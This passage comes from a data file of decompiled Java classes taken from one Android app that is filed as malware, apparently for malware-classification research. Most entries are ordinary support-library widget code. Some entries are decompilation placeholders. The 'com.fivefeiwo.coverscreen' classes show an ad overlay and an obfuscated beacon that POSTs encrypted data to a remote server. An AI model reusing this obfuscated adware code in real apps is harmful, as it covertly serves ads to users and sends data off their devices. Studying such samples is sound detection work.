searchView){     return SearchViewCompatHoneycomb.isIconified(searchView);   }   @Override public void setSubmitButtonEnabled(  View searchView,  boolean enabled){     SearchViewCompatHoneycomb.setSubmitButtonEnabled(searchView,enabled);   }   @Override public boolean isSubmitButtonEnabled(  View searchView){     return SearchViewCompatHoneycomb.isSubmitButtonEnabled(searchView);   }   @Override public void setQueryRefinementEnabled(  View searchView,  boolean enable){     SearchViewCompatHoneycomb.setQueryRefinementEnabled(searchView,enable);   }   @Override public boolean isQueryRefinementEnabled(  View searchView){     return SearchViewCompatHoneycomb.isQueryRefinementEnabled(searchView);   }   @Override public void setMaxWidth(  View searchView,  int maxpixels){     SearchViewCompatHoneycomb.setMaxWidth(searchView,maxpixels);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SearchViewCompatIcs.code","class SearchViewCompatIcs {   SearchViewCompatIcs(){   } public static class MySearchView extends SearchView {     public MySearchView(    Context context){       super(context);     }     @Override public void onActionViewCollapsed(){       setQuery("""",false);       super.onActionViewCollapsed();     }   }   public static View newSearchView(  Context context){     return new MySearchView(context);   }   public static void setImeOptions(  View searchView,  int imeOptions){     ((SearchView)searchView).setImeOptions(imeOptions);   }   public static void setInputType(  View searchView,  int inputType){     ((SearchView)searchView).setInputType(inputType);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SearchViewCompatIcsImpl.code","static class SearchViewCompatIcsImpl extends SearchViewCompatHoneycombImpl {   SearchViewCompatIcsImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatIcs.newSearchView(context);   }   @Override public void setImeOptions(  View searchView,  int imeOptions){     SearchViewCompatIcs.setImeOptions(searchView,imeOptions);   }   @Override public void setInputType(  View searchView,  int inputType){     SearchViewCompatIcs.setInputType(searchView,inputType);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SearchViewCompatImpl.code","interface SearchViewCompatImpl {   CharSequence getQuery(  View view);   boolean isIconified(  View view);   boolean isQueryRefinementEnabled(  View view);   boolean isSubmitButtonEnabled(  View view);   Object newOnCloseListener(  OnCloseListenerCompat onCloseListenerCompat);   Object newOnQueryTextListener(  OnQueryTextListenerCompat onQueryTextListenerCompat);   View newSearchView(  Context context);   void setIconified(  View view,  boolean z);   void setImeOptions(  View view,  int i);   void setInputType(  View view,  int i);   void setMaxWidth(  View view,  int i);   void setOnCloseListener(  Object obj,  Object obj2);   void setOnQueryTextListener(  Object obj,  Object obj2);   void setQuery(  View view,  CharSequence charSequence,  boolean z);   void setQueryHint(  View view,  CharSequence charSequence);   void setQueryRefinementEnabled(  View view,  boolean z);   void setSearchableInfo(  View view,  ComponentName componentName);   void setSubmitButtonEnabled(  View view,  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SearchViewCompatStubImpl.code","static class SearchViewCompatStubImpl implements SearchViewCompatImpl {   SearchViewCompatStubImpl(){   }   @Override public View newSearchView(  Context context){     return null;   }   @Override public void setSearchableInfo(  View searchView,  ComponentName searchableComponent){   }   @Override public void setImeOptions(  View searchView,  int imeOptions){   }   @Override public void setInputType(  View searchView,  int inputType){   }   @Override public Object newOnQueryTextListener(  OnQueryTextListenerCompat listener){     return null;   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){   }   @Override public Object newOnCloseListener(  OnCloseListenerCompat listener){     return null;   }   @Override public void setOnCloseListener(  Object searchView,  Object listener){   }   @Override public CharSequence getQuery(  View searchView){     return null;   }   @Override public void setQuery(  View searchView,  CharSequence query,  boolean submit){   }   @Override public void setQueryHint(  View searchView,  CharSequence hint){   }   @Override public void setIconified(  View searchView,  boolean iconify){   }   @Override public boolean isIconified(  View searchView){     return true;   }   @Override public void setSubmitButtonEnabled(  View searchView,  boolean enabled){   }   @Override public boolean isSubmitButtonEnabled(  View searchView){     return false;   }   @Override public void setQueryRefinementEnabled(  View searchView,  boolean enable){   }   @Override public boolean isQueryRefinementEnabled(  View searchView){     return false;   }   @Override public void setMaxWidth(  View searchView,  int maxpixels){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SimpleCursorAdapter.code","public class SimpleCursorAdapter extends ResourceCursorAdapter {   private CursorToStringConverter mCursorToStringConverter;   protected int[] mFrom;   String[] mOriginalFrom;   private int mStringConversionColumn;   protected int[] mTo;   private ViewBinder mViewBinder; public interface CursorToStringConverter {     CharSequence convertToString(    Cursor cursor);   } public interface ViewBinder {     boolean setViewValue(    View view,    Cursor cursor,    int i);   }   @Deprecated public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to){     super(context,layout,c);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to,  int flags){     super(context,layout,c,flags);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   @Override public void bindView(  View view,  Context context,  Cursor cursor){     ViewBinder binder=this.mViewBinder;     int count=this.mTo.length;     int[] from=this.mFrom;     int[] to=this.mTo;     for (int i=0; i < count; i++) {       View v=view.findViewById(to[i]);       if (v != null) {         boolean bound=false;         if (binder != null) {           bound=binder.setViewValue(v,cursor,from[i]);         }         if (bound) {           continue;         }  else {           String text=cursor.getString(from[i]);           if (text == null) {             text="""";           }           if (v instanceof TextView) {             setViewText((TextView)v,text);           }  else           if (v instanceof ImageView) {             setViewImage((ImageView)v,text);           }  else {             throw new IllegalStateException(v.getClass().getName() + "" is not a  view that can be bounds by this SimpleCursorAdapter"");           }         }       }     }   }   public ViewBinder getViewBinder(){     return this.mViewBinder;   }   public void setViewBinder(  ViewBinder viewBinder){     this.mViewBinder=viewBinder;   }   public void setViewImage(  ImageView v,  String value){     try {       v.setImageResource(Integer.parseInt(value));     }  catch (    NumberFormatException e) {       v.setImageURI(Uri.parse(value));     }   }   public void setViewText(  TextView v,  String text){     v.setText(text);   }   public int getStringConversionColumn(){     return this.mStringConversionColumn;   }   public void setStringConversionColumn(  int stringConversionColumn){     this.mStringConversionColumn=stringConversionColumn;   }   public CursorToStringConverter getCursorToStringConverter(){     return this.mCursorToStringConverter;   }   public void setCursorToStringConverter(  CursorToStringConverter cursorToStringConverter){     this.mCursorToStringConverter=cursorToStringConverter;   }   @Override public CharSequence convertToString(  Cursor cursor){     if (this.mCursorToStringConverter != null) {       return this.mCursorToStringConverter.convertToString(cursor);     }     if (this.mStringConversionColumn > -1) {       return cursor.getString(this.mStringConversionColumn);     }     return super.convertToString(cursor);   }   private void findColumns(  String[] from){     if (this.mCursor != null) {       int count=from.length;       if (this.mFrom == null || this.mFrom.length != count) {         this.mFrom=new int[count];       }       for (int i=0; i < count; i++) {         this.mFrom[i]=this.mCursor.getColumnIndexOrThrow(from[i]);       }       return;     }     this.mFrom=null;   }   @Override public Cursor swapCursor(  Cursor c){     Cursor res=super.swapCursor(c);     findColumns(this.mOriginalFrom);     return res;   }   public void changeCursorAndColumns(  Cursor c,  String[] from,  int[] to){     this.mOriginalFrom=from;     this.mTo=to;     super.changeCursor(c);     findColumns(this.mOriginalFrom);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SimpleDrawerListener.code","public static abstract class SimpleDrawerListener implements DrawerListener {   @Override public void onDrawerSlide(  View drawerView,  float slideOffset){   }   @Override public void onDrawerOpened(  View drawerView){   }   @Override public void onDrawerClosed(  View drawerView){   }   @Override public void onDrawerStateChanged(  int newState){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SimplePanelSlideListener.code","public static class SimplePanelSlideListener implements PanelSlideListener {   @Override public void onPanelSlide(  View panel,  float slideOffset){   }   @Override public void onPanelOpened(  View panel){   }   @Override public void onPanelClosed(  View panel){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SlidingPaneLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@30d92040"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SlidingPanelLayoutImpl.code","public interface SlidingPanelLayoutImpl {   void invalidateChildRegion(  SlidingPaneLayout slidingPaneLayout,  View view); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SlidingPanelLayoutImplBase.code","static class SlidingPanelLayoutImplBase implements SlidingPanelLayoutImpl {   SlidingPanelLayoutImplBase(){   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     ViewCompat.postInvalidateOnAnimation(parent,child.getLeft(),child.getTop(),child.getRight(),child.getBottom());   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SlidingPanelLayoutImplJB.code","static class SlidingPanelLayoutImplJB extends SlidingPanelLayoutImplBase {   private Method mGetDisplayList;   private Field mRecreateDisplayList;   SlidingPanelLayoutImplJB(){     try {       this.mGetDisplayList=View.class.getDeclaredMethod(""getDisplayList"",(Class[])null);     }  catch (    NoSuchMethodException e) {       Log.e(SlidingPaneLayout.TAG,""Couldn't fetch getDisplayList method; dimming won't work right."",e);     }     try {       this.mRecreateDisplayList=View.class.getDeclaredField(""mRecreateDisplayList"");       this.mRecreateDisplayList.setAccessible(true);     }  catch (    NoSuchFieldException e2) {       Log.e(SlidingPaneLayout.TAG,""Couldn't fetch mRecreateDisplayList field; dimming will be slow."",e2);     }   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     if (this.mGetDisplayList != null && this.mRecreateDisplayList != null) {       try {         this.mRecreateDisplayList.setBoolean(child,true);         this.mGetDisplayList.invoke(child,(Object[])null);       }  catch (      Exception e) {         Log.e(SlidingPaneLayout.TAG,""Error refreshing display list state"",e);       }       super.invalidateChildRegion(parent,child);       return;     }     child.invalidate();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SlidingPanelLayoutImplJBMR1.code","static class SlidingPanelLayoutImplJBMR1 extends SlidingPanelLayoutImplBase {   SlidingPanelLayoutImplJBMR1(){   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     ViewCompat.setLayerPaint(child,((LayoutParams)child.getLayoutParams()).dimPaint);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ViewBinder.code","public interface ViewBinder {   boolean setViewValue(  View view,  Cursor cursor,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ViewDragCallback.code","public class ViewDragCallback extends ViewDragHelper.Callback {   private final int mAbsGravity;   private ViewDragHelper mDragger;   private final Runnable mPeekRunnable=new Runnable(){     @Override public void run(){       ViewDragCallback.this.peekDrawer();     }   } ;   public ViewDragCallback(  int gravity){     this.mAbsGravity=gravity;   }   public void setDragger(  ViewDragHelper dragger){     this.mDragger=dragger;   }   public void removeCallbacks(){     DrawerLayout.this.removeCallbacks(this.mPeekRunnable);   }   @Override public boolean tryCaptureView(  View child,  int pointerId){     return (DrawerLayout.this.isDrawerView(child) && DrawerLayout.this.checkDrawerViewAbsoluteGravity(child,this.mAbsGravity) && DrawerLayout.this.getDrawerLockMode(child) == 0) ? DrawerLayout.CHILDREN_DISALLOW_INTERCEPT : DrawerLayout.ALLOW_EDGE_LOCK;   }   @Override public void onViewDragStateChanged(  int state){     DrawerLayout.this.updateDrawerState(this.mAbsGravity,state,this.mDragger.getCapturedView());   }   @Override public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){     float offset;     int childWidth=changedView.getWidth();     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(changedView,3)) {       offset=(childWidth + left) / childWidth;     }  else {       int width=DrawerLayout.this.getWidth();       offset=(width - left) / childWidth;     }     DrawerLayout.this.setDrawerViewOffset(changedView,offset);     changedView.setVisibility(offset == 0.0f ? 4 : 0);     DrawerLayout.this.invalidate();   }   @Override public void onViewCaptured(  View capturedChild,  int activePointerId){     LayoutParams lp=(LayoutParams)capturedChild.getLayoutParams();     lp.isPeeking=DrawerLayout.ALLOW_EDGE_LOCK;     closeOtherDrawer();   }   private void closeOtherDrawer(){     int otherGrav=this.mAbsGravity == 3 ? 5 : 3;     View toClose=DrawerLayout.this.findDrawerWithGravity(otherGrav);     if (toClose != null) {       DrawerLayout.this.closeDrawer(toClose);     }   }   @Override public void onViewReleased(  View releasedChild,  float xvel,  float yvel){     int left;     float offset=DrawerLayout.this.getDrawerViewOffset(releasedChild);     int childWidth=releasedChild.getWidth();     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(releasedChild,3)) {       left=(xvel > 0.0f || (xvel == 0.0f && offset > 0.5f)) ? 0 : -childWidth;     }  else {       int width=DrawerLayout.this.getWidth();       left=(xvel < 0.0f || (xvel == 0.0f && offset > 0.5f)) ? width - childWidth : width;     }     this.mDragger.settleCapturedViewAt(left,releasedChild.getTop());     DrawerLayout.this.invalidate();   }   @Override public void onEdgeTouched(  int edgeFlags,  int pointerId){     DrawerLayout.this.postDelayed(this.mPeekRunnable,160L);   }   public void peekDrawer(){     View toCapture;     int childLeft;     int peekDistance=this.mDragger.getEdgeSize();     boolean leftEdge=this.mAbsGravity == 3;     if (leftEdge) {       toCapture=DrawerLayout.this.findDrawerWithGravity(3);       childLeft=(toCapture != null ? -toCapture.getWidth() : 0) + peekDistance;     }  else {       toCapture=DrawerLayout.this.findDrawerWithGravity(5);       childLeft=DrawerLayout.this.getWidth() - peekDistance;     }     if (toCapture != null) {       if (((leftEdge && toCapture.getLeft() < childLeft) || (!leftEdge && toCapture.getLeft() > childLeft)) && DrawerLayout.this.getDrawerLockMode(toCapture) == 0) {         LayoutParams lp=(LayoutParams)toCapture.getLayoutParams();         this.mDragger.smoothSlideViewTo(toCapture,childLeft,toCapture.getTop());         lp.isPeeking=DrawerLayout.CHILDREN_DISALLOW_INTERCEPT;         DrawerLayout.this.invalidate();         closeOtherDrawer();         DrawerLayout.this.cancelChildViewTouch();       }     }   }   @Override public boolean onEdgeLock(  int edgeFlags){     return DrawerLayout.ALLOW_EDGE_LOCK;   }   @Override public void onEdgeDragStarted(  int edgeFlags,  int pointerId){     View toCapture;     if ((edgeFlags & 1) == 1) {       toCapture=DrawerLayout.this.findDrawerWithGravity(3);     }  else {       toCapture=DrawerLayout.this.findDrawerWithGravity(5);     }     if (toCapture != null && DrawerLayout.this.getDrawerLockMode(toCapture) == 0) {       this.mDragger.captureChildView(toCapture,pointerId);     }   }   @Override public int getViewHorizontalDragRange(  View child){     return child.getWidth();   }   @Override public int clampViewPositionHorizontal(  View child,  int left,  int dx){     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(child,3)) {       return Math.max(-child.getWidth(),Math.min(left,0));     }     int width=DrawerLayout.this.getWidth();     return Math.max(width - child.getWidth(),Math.min(left,width));   }   @Override public int clampViewPositionVertical(  View child,  int top,  int dy){     return child.getTop();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ViewDragHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5908b416"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\A.code","public final class A extends C0020s implements GestureDetector.OnGestureListener {   GestureDetector c;   ViewFlipper d;   int e;   private int f;   private int g;   private int h;   private int i;   private int j;   private int k;   private int l;   private int m;   private int n;   private int o;   private int p;   private int q;   private int r;   private int s;   private LinearLayout t;   public A(  SA sa,  List list,  int i){     super(sa,list);     this.f=1;     this.g=32;     this.h=this.g / 2;     this.i=275;     this.j=180;     this.k=5;     this.l=50;     this.m=50;     this.n=14;     this.o=96;     this.p=36;     this.q=this.i + this.g + (this.f << 1);     this.r=this.j + this.g + (this.f << 1)+ this.k+ this.m;     this.s=12;     this.e=0;     this.e=i;     this.c=new GestureDetector(sa,this);     b();   }   @Override public final int a(  View view,  Q q){     this.d.removeView(view);     this.e=super.a(view,q);     return this.e;   }   @Override protected final void c(){     this.f=an.a(getContext(),this.f);     this.g=an.a(getContext(),this.g);     this.q=an.a(getContext(),this.q);     this.r=an.a(getContext(),this.r);     this.h=an.a(getContext(),this.h);     this.i=an.a(getContext(),this.i);     this.j=an.a(getContext(),this.j);     this.k=an.a(getContext(),this.k);     this.l=an.a(getContext(),this.l);     this.m=an.a(getContext(),this.m);     this.p=an.a(getContext(),this.p);     this.o=an.a(getContext(),this.o);     this.s=an.a(getContext(),this.s);     Rect rect=new Rect();     this.a.getWindow().getDecorView().getWindowVisibleDisplayFrame(rect);     new StringBuilder().append(""initParam: [imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"").append(rect);     int width=rect.width() - this.q;     new StringBuilder().append(""extraWidth: "").append(width).append("",frame.width: "").append(rect.width()).append("",outContainerWidth: "").append(this.q);     if (width < 0 || Math.abs(width) > 10) {       double height=(rect.height() - 10) / this.r;       double width2=(rect.width() - 10) / this.q;       if (height <= width2) {         width2=height;       }       double d=width2 <= 1.5d ? width2 : 1.5d;       this.f=(int)(this.f * d);       this.g=(int)(this.g * d);       this.q=(int)(this.q * d);       this.r=(int)(this.r * d);       this.h=(int)(this.h * d);       this.i=(int)(this.i * d);       this.j=(int)(this.j * d);       this.k=(int)(this.k * d);       this.l=(int)(this.l * d);       this.m=(int)(this.m * d);       this.p=(int)(this.p * d);       this.o=(int)(this.o * d);       this.n=(int)(this.n * d);       this.s=(int)(this.s * d);       new StringBuilder().append(""initParam: [rate: "").append(d).append("",imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"");     }   }   @Override protected final void d(){     float a=an.a(getContext(),5.0f);     ShapeDrawable shapeDrawable=new ShapeDrawable(new RoundRectShape(new float[]{a,a,a,a,a,a,a,a},null,null));     shapeDrawable.setPadding(this.f,this.f,this.f,this.f);     shapeDrawable.getPaint().setColor(-1);     RelativeLayout relativeLayout=new RelativeLayout(getContext());     relativeLayout.setLayoutParams(new LinearLayout.LayoutParams(this.q,this.r));     addView(relativeLayout);     LinearLayout linearLayout=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.setMargins(this.h,this.h,this.h,this.h);     layoutParams.addRule(13,-1);     linearLayout.setLayoutParams(layoutParams);     linearLayout.setBackgroundDrawable(shapeDrawable);     linearLayout.setOrientation(1);     linearLayout.setGravity(17);     relativeLayout.addView(linearLayout);     ImageView imageView=new ImageView(getContext());     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(10,-1);     layoutParams2.addRule(11,-1);     int i=this.g;     layoutParams2.width=i;     layoutParams2.height=i;     imageView.setLayoutParams(layoutParams2);     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     getContext();     imageView.setImageDrawable(an.a(S.f));     relativeLayout.addView(imageView);     imageView.setOnClickListener(new ViewOnClickListenerC0021t(this));     this.d=new ViewFlipper(getContext());     this.d.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));     for (    Q q : this.b) {       LinearLayout linearLayout2=new LinearLayout(getContext());       linearLayout2.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));       linearLayout2.setOrientation(1);       ImageView imageView2=new ImageView(getContext());       imageView2.setLayoutParams(new LinearLayout.LayoutParams(this.i,this.j));       imageView2.setScaleType(ImageView.ScaleType.FIT_XY);       a(imageView2,q.b(),true);       linearLayout2.addView(imageView2);       LinearLayout linearLayout3=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);       layoutParams3.topMargin=this.k;       linearLayout3.setLayoutParams(layoutParams3);       linearLayout3.setOrientation(0);       linearLayout2.addView(linearLayout3);       ImageView imageView3=new ImageView(getContext());       imageView3.setLayoutParams(new LinearLayout.LayoutParams(this.l,this.m));       imageView3.setScaleType(ImageView.ScaleType.FIT_XY);       a(imageView3,q.j(),false);       linearLayout3.addView(imageView3);       LinearLayout linearLayout4=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(0,-1);       layoutParams4.leftMargin=an.a(getContext(),4.0f);       layoutParams4.weight=1.0f;       linearLayout4.setLayoutParams(layoutParams4);       linearLayout4.setGravity(16);       linearLayout4.setOrientation(1);       linearLayout3.addView(linearLayout4);       TextView textView=new TextView(getContext());       LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2);       if (Q.a.equals(q.h())) {         textView.setText(q.d());       }  else {         textView.setText(q.c());       }       textView.setTextColor(ViewCompat.MEASURED_STATE_MASK);       textView.setTextSize(this.n);       textView.setTypeface(Typeface.DEFAULT_BOLD);       textView.setLayoutParams(layoutParams5);       linearLayout4.addView(textView);       if (Q.a.equals(q.h())) {         TextView textView2=new TextView(getContext());         LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);         layoutParams6.topMargin=an.a(getContext(),2.0f);         textView2.setText(q.l());         textView2.setTextColor(ViewCompat.MEASURED_STATE_MASK);         textView2.setTextSize(this.n - 2);         textView2.setLayoutParams(layoutParams6);         linearLayout4.addView(textView2);       }       ImageView imageView4=new ImageView(getContext());       LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(this.o,this.p);       layoutParams7.gravity=16;       imageView4.setLayoutParams(layoutParams7);       imageView4.setScaleType(ImageView.ScaleType.FIT_XY);       if (Q.a.equals(q.h())) {         getContext();         imageView4.setImageDrawable(an.a(S.g));       }  else {         getContext();         imageView4.setImageDrawable(an.a(S.h));       }       linearLayout3.addView(imageView4);       this.d.addView(linearLayout2);     }     linearLayout.addView(this.d);     this.t=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams8=new RelativeLayout.LayoutParams(-1,-2);     layoutParams8.addRule(12,-1);     layoutParams8.addRule(14,-1);     layoutParams8.bottomMargin=this.g;     this.t.setVisibility(8);     this.t.setLayoutParams(layoutParams8);     this.t.setGravity(1);     relativeLayout.addView(this.t);     if (this.e < 0 || this.e >= this.b.size()) {       this.e=0;     }     this.d.setDisplayedChild(this.e);     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);     B b=new B(this,linearLayout);     Animation scaleAnimation=new ScaleAnimation(0.0f,1.0f,0.0f,1.0f,1,0.5f,1,0.5f);     scaleAnimation.setDuration(1000L);     scaleAnimation.setAnimationListener(new AnimationAnimationListenerC0025x(this,b,relativeLayout));     relativeLayout.startAnimation(scaleAnimation);   }   @Override public final void f(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     translateAnimation2.setDuration(500L);     this.d.setInAnimation(translateAnimation);     this.d.setOutAnimation(translateAnimation2);     this.d.showNext();     this.e++;     if (this.e >= this.b.size()) {       this.e=0;     }     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);   }   @Override public final boolean onDown(  MotionEvent motionEvent){     g();     return false;   }   @Override public final boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     if (this.b.size() <= 1) {       return true;     }     if (motionEvent2.getX() - motionEvent.getX() > 120.0f) {       TranslateAnimation translateAnimation=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);       translateAnimation.setDuration(500L);       TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);       translateAnimation2.setDuration(500L);       this.d.setInAnimation(translateAnimation);       this.d.setOutAnimation(translateAnimation2);       this.d.showPrevious();       this.e--;       if (this.e < 0) {         this.e=this.b.size() - 1;       }       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(this.e + 1);       }       a(this.e);     }  else     if (motionEvent2.getX() - motionEvent.getX() < -120.0f) {       f();     }     g();     return true;   }   @Override public final void onLongPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onScroll(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     g();     return false;   }   @Override public final void onShowPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onSingleTapUp(  MotionEvent motionEvent){     g();     if (this.e >= this.b.size()) {       f();     }  else {       b(this.d.getChildAt(this.e),(Q)this.b.get(this.e));     }     return true;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\aa.code","public interface aa {   void a(  boolean z,  String str); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ab.code","public final class ab implements Runnable {   private URL a=null;   private aa b;   private String c;   private String d;   private Context e;   public final void a(  Context context,  String str,  String str2,  String str3){     this.e=context;     this.c=str2;     this.d=str3;     try {       this.a=new URL(str);     }  catch (    MalformedURLException e) {       new StringBuilder().append("""").append(e);     }     new StringBuilder().append(""setBaseRequestInfo, url: "").append(str);   }   public final void a(  aa aaVar){     this.b=aaVar;   }   @Override public final void run(){     int b=P.b(this.e);     if (b == 0) {       return;     }     Context context=this.e;     new StringBuilder().append(""\nG_èŽ·å�–æ•°æ�®  > "").append(new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").format(new Date(System.currentTimeMillis())));     Context context2=this.e;     new StringBuilder().append(""\nG_JSON      "").append(this.d);     if (this.a == null) {       Context context3=this.e;       throw new IllegalArgumentException(""URL must be init!_feiwocp"".replace(""_feiwocp"",""""));     }     if (aq.a(this.c)) {       Context context4=this.e;       throw new IllegalArgumentException(""password must be init!_feiwocp"".replace(""_feiwocp"",""""));     }     HttpURLConnection httpURLConnection=null;     try {       try {         try {           try {             String defaultHost=Proxy.getDefaultHost();             int defaultPort=Proxy.getDefaultPort();             new StringBuilder().append(""proxyHost: "").append(defaultHost).append("", port: "").append(defaultPort);             HttpURLConnection httpURLConnection2=(2 != b || defaultHost == null || defaultPort <= 0) ? (HttpURLConnection)this.a.openConnection() : (HttpURLConnection)this.a.openConnection(new java.net.Proxy(Proxy.Type.HTTP,new InetSocketAddress(defaultHost,defaultPort)));             httpURLConnection2.setRequestMethod(""POST_feiwocp"".replace(""_feiwocp"",""""));             httpURLConnection2.setRequestProperty(""content-type"",""application/x-www-form-urlencoded_feiwocp"".replace(""_feiwocp"",""""));             httpURLConnection2.addRequestProperty(""appkey_feiwocp"".replace(""_feiwocp"",""""),this.c);             httpURLConnection2.setDoOutput(true);             httpURLConnection2.setConnectTimeout(60000);             httpURLConnection2.setReadTimeout(30000);             BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(httpURLConnection2.getOutputStream()));             bufferedWriter.write(R.a(this.d,R.a(this.c),false));             bufferedWriter.close();             int responseCode=httpURLConnection2.getResponseCode();             new StringBuilder().append(""get url response code: "").append(responseCode).append("", "").append(this.a);             BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(responseCode != 200 ? httpURLConnection2.getErrorStream() : httpURLConnection2.getInputStream()));             StringBuilder sb=new StringBuilder();             while (true) {               String readLine=bufferedReader.readLine();               if (readLine == null) {                 break;               }  else {                 sb.append(readLine);               }             }             bufferedReader.close();             if (responseCode == 200) {               this.b.a(true,R.a(sb.toString(),R.a(this.c)));             }  else {               this.b.a(false,R.a(sb.toString(),R.a(this.c)));             }             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          Exception e) {             this.b.a(false,""Exception: _feiwocp"".replace(""_feiwocp"","""") + e);             Context context5=this.e;             new StringBuilder().append(""\nG_error Exception > "").append(e).append("" > "");             if (0 != 0) {               httpURLConnection.disconnect();             }           }         }  catch (        SocketTimeoutException e2) {           Context context6=this.e;           new StringBuilder().append(""\nG_error > SocketTimeoutException > "").append(e2).append("" > "");           this.b.a(false,""SocketTimeoutException _feiwocp"".replace(""_feiwocp"","""") + e2);           if (0 != 0) {             httpURLConnection.disconnect();           }         }       }  catch (      SocketException e3) {         Context context7=this.e;         new StringBuilder().append(""\nG_error SocketException > "").append(e3).append("" > "");         this.b.a(false,""SocketException _feiwocp"".replace(""_feiwocp"","""") + e3);         if (0 != 0) {           httpURLConnection.disconnect();         }       } catch (      IOException e4) {         Context context8=this.e;         new StringBuilder().append(""\nG_error IOException > "").append(e4).append("" > "");         this.b.a(false,""IOException: _feiwocp"".replace(""_feiwocp"","""") + e4);         if (0 != 0) {           httpURLConnection.disconnect();         }       }     }  catch (    